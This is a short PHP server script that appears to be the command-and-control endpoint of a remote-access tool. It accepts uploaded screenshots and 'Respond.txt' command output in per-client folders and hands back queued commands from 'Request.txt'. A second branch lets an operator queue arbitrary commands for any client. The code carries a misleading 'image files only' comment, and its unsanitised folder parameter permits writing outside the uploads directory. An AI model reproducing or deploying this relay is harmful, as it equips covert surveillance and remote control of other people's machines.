<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if(isset($_FILES['file'])) {
        $file = $_FILES['file']; // Get the uploaded file
        // Check if the file was uploaded without errors
        if ($file['error'] === UPLOAD_ERR_OK) {
            $filename = basename($file['name']); // Get the uploaded file's name
            $fileExtension = pathinfo($filename, PATHINFO_EXTENSION);

            // Allow only image files
            $allowedExtensions = ['jpg', 'txt'];
            if (!in_array(strtolower($fileExtension), $allowedExtensions)) {
                echo "Only image files are allowed!";
                exit;
            }

            // Create folder name based on the file name (without extension)
            $targetDir = 'uploads/' . pathinfo($filename, PATHINFO_FILENAME); 

            // Ensure the directory exists, create if not
            if (!file_exists($targetDir)) {
                mkdir($targetDir, 0777, true); // Create the directory with proper permissions
            }

            if(strtolower(substr($filename, -4)) === ".jpg") {
                $targetFile = $targetDir . '/ScreenShot.jpg'; // Define the target file name
            }
            else {
                $targetFile = $targetDir . '/Respond.txt'; // Define the target file name
            }
            

            // Move the uploaded file to the target directory
            if (move_uploaded_file($file['tmp_name'], $targetFile)) {
                $filename = "$targetDir/Request.txt";
                if(file_exists($filename)) {
                    // Read the content of the file
                    $content = file_get_contents($filename);
                    echo $content;
                    unlink($filename);
                }
            } 
        } 
    }
    else if(isset($_POST['current']) && isset($_POST['command'])) {
        $current = $_POST['current'];
        $command = $_POST['command'];
        $filename = "uploads/$current/Request.txt";
        // Write to the file (it will create the file if it doesn't exist)
        file_put_contents($filename, $command);

        // You can check if the file has been written successfully
        if (file_exists($filename)) {
            echo "File has been written successfully.";
        } else {
            echo "Failed to write to file.";
        }  
    }
}
?>
